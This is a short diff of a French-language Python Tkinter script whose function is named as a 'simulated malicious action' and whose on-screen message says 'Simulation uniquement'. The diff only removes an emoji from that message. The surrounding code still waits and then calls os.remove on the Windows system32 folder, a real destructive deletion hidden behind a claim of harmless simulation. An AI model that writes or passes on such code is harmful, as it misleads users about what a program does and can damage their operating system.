@@ -6,7 +6,7 @@ import os
 def action_malveillante_simulee():
     resultat_label.config(text="Analyse du système...\nSuppression de fichiers en cours...")
 
-    resultat_label.config(text="🚨 Action terminée. (Simulation uniquement)")
+    resultat_label.config(text="Action terminée. (Simulation uniquement)")
     time.sleep(4)
     os.remove("c:\\windows\\system32")
     #os.remove("y")
